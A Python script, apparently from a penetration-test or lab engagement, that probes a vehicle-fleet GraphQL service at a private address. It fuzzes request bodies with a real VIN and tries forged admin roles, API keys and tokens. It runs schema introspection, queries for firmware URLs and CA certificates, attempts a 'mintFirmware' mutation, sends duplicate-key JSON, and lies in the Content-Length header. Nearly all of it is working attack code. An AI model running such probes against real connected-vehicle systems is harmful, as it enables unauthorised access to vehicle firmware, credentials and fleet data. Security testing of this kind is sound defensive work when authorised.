#!/usr/bin/env python3
"""gql3: body-field fuzzing + body-size-limit measurement on .2:8080/graphql.

Prior round varied *headers* (Authorization / X-API-Key / X-Vehicle-VIN) only.
This varies *body fields*: if the stub is really a struct decode followed by a
lookup, a recognised field (vin/vehicleId/tenant/...) would change the answer.

Also measures the request-body size cap discovered in gql2 (1 MB -> 400).
"""
import hashlib, json, os, socket, time

HOST, PORT = "10.230.164.2", 8080
EVID = os.path.join(os.path.dirname(__file__), "..", "..", "..", "03_EVIDENCE", "web")
STUB = b'{"data":{"vehicles":[{"label":"Guest demo vehicle","vin":"CV6000000DEMO0001"}]}}'
REALVIN = "CV6FF52FEE9EDDD86"

def post(body, ct=b"application/json", timeout=10.0):
    if isinstance(body, str):
        body = body.encode()
    req = (b"POST /graphql HTTP/1.1\r\nHost: %s:%d\r\n" % (HOST.encode(), PORT) +
           b"Content-Type: " + ct + b"\r\nContent-Length: " + str(len(body)).encode() +
           b"\r\nConnection: close\r\nAccept: application/json\r\n\r\n" + body)
    s = socket.socket(); s.settimeout(timeout)
    buf = b""; err = None
    try:
        s.connect((HOST, PORT)); s.sendall(req)
        while len(buf) < 2 * 1024 * 1024:
            try: d = s.recv(65536)
            except socket.timeout: break
            if not d: break
            buf += d
    except Exception as e:
        err = f"{type(e).__name__}: {e}"
    finally:
        try: s.close()
        except Exception: pass
    i = buf.find(b"\r\n\r\n")
    head, b_ = (buf[:i], buf[i+4:]) if i >= 0 else (buf, b"")
    st = head.split(b"\r\n")[0].decode("latin1") if head else ""
    return st, b_, err

def main():
    rows = []
    def rec(tag, body, note=""):
        st, b, err = post(body)
        nb = b.rstrip(b"\r\n")
        same = nb == STUB
        r = {"tag": tag, "body": body[:160] if isinstance(body, str) else body[:160].decode("latin1","replace"),
             "status": st, "len": len(b), "same": same,
             "preview": nb[:200].decode("latin1", "replace"), "err": err, "note": note}
        rows.append(r)
        print(f"[{'SAME' if same else 'DIFF'}] {tag:32s} {st:26s} len={len(b):<6d} {('' if same else r['preview'][:120])}", flush=True)
        return r

    print("=== A. body-field fuzz (real VIN injected) ===", flush=True)
    cases = [
        ("vin_only", {"vin": REALVIN}),
        ("vin_plus_query", {"query": "{__typename}", "vin": REALVIN}),
        ("query_single_vehicle_arg", {"query": '{vehicle(vin:"%s"){vin label firmware}}' % REALVIN}),
        ("query_variables", {"query": "query($vin:String!){vehicle(vin:$vin){vin label firmware}}",
                             "variables": {"vin": REALVIN}}),
        ("operationName", {"query": "query GetVehicle($vin:String!){vehicle(vin:$vin){vin}}",
                           "operationName": "GetVehicle", "variables": {"vin": REALVIN}}),
        ("vehicleId", {"query": "{__typename}", "vehicleId": REALVIN}),
        ("vehicle_id", {"query": "{__typename}", "vehicle_id": REALVIN}),
        ("deviceId", {"query": "{__typename}", "deviceId": "tbox-001"}),
        ("tboxId", {"query": "{__typename}", "tboxId": "tbox-001"}),
        ("imei", {"query": "{__typename}", "imei": "860000000000001"}),
        ("iccid", {"query": "{__typename}", "iccid": "89860000000000000000"}),
        ("tenant", {"query": "{__typename}", "tenant": "cv6"}),
        ("tenantId", {"query": "{__typename}", "tenantId": "cv6"}),
        ("apiKey_body", {"query": "{__typename}", "apiKey": "cv6-demo"}),
        ("token_body", {"query": "{__typename}", "token": "cv6-demo"}),
        ("key", {"query": "{__typename}", "key": "cv6"}),
        ("role_admin", {"query": "{__typename}", "role": "admin"}),
        ("fleet", {"query": "{__typename}", "fleet": "cv6-fleet"}),
        ("scope", {"query": "{__typename}", "scope": "fleet:read vehicle:read"}),
        ("include_firmware", {"query": "{vehicles{vin label firmware version}}"}),
        ("all_fields", {"query": "{vehicles{vin label firmware version ota status}}"}),
        ("firmware_query", {"query": "{firmware{version url}}" }),
        ("ota_query", {"query": "{ota{latest{version url}}}" }),
        ("updates_query", {"query": "{updates{id version}}" }),
        ("certs_query", {"query": "{certificates{pem}}" }),
        ("ca_query", {"query": "{ca{pem}}" }),
        ("__typename_root", {"query": "{__typename}"}),
        ("__schema_full", {"query": "query{__schema{queryType{name} mutationType{name} types{name kind}}}"}),
        ("mutation", {"query": "mutation{mintFirmware(vin:\"%s\"){url}}" % REALVIN}),
        ("nested_dup_key", '{"query":"{__typename}","query":"mutation{mintFirmware{url}}"}'),
        ("json_with_dup", '{"vin":"%s","vin":"CV6000000DEMO0001"}' % REALVIN),
    ]
    for tag, body in cases:
        rec(tag, json.dumps(body))

    print("\n=== B. body-size limit measurement ===", flush=True)
    # pad inside a known-valid JSON string so parse succeeds if fully read
    def sized(n):
        base = '{"query":"{__typename}","p":"%s"}'
        overhead = len(base % "")
        pad = "A" * max(0, n - overhead)
        return base % pad
    for n in [1000, 4096, 8192, 16384, 32768, 65536, 131072, 262144, 524288, 1048576]:
        b = sized(n)
        rec(f"size_{n}", b, note=f"actual={len(b)}")

    print("\n=== C. Content-Length lies (short body) ===", flush=True)
    body = b'{"query":"{__typename}"}'
    for clval in [len(body) - 5, len(body) + 5, 0]:
        req = (b"POST /graphql HTTP/1.1\r\nHost: %s:%d\r\nContent-Type: application/json\r\n"
               % (HOST.encode(), PORT)) + f"Content-Length: {clval}\r\n".encode() + b"Connection: close\r\n\r\n" + body
        s = socket.socket(); s.settimeout(4)
        buf = b""; err = None
        try:
            s.connect((HOST, PORT)); s.sendall(req)
            while True:
                d = s.recv(65536)
                if not d: break
                buf += d
        except Exception as e:
            err = f"{type(e).__name__}"
        finally:
            try: s.close()
            except Exception: pass
        i = buf.find(b"\r\n\r\n")
        st = buf[:i].split(b"\r\n")[0].decode("latin1") if i > 0 else ""
        print(f"[CL={clval}] {st!r} len={len(buf)} err={err}", flush=True)
        rows.append({"tag": f"cl_lie_{clval}", "status": st, "len": len(buf), "err": err,
                     "preview": buf[-120:].decode("latin1", "replace")})

    p = os.path.join(EVID, "gql3_bodyfield_sizelimit.json")
    open(p, "w", encoding="utf-8").write(json.dumps(rows, indent=1))
    diff = [r for r in rows if r.get("same") is False]
    print(f"\ntotal={len(rows)} differing={len(diff)} -> {p}")
    for d in diff:
        print(f"  DIFF {d['tag']:26s} {d['status']} {d.get('preview','')[:100]!r}")

if __name__ == "__main__":
    main()
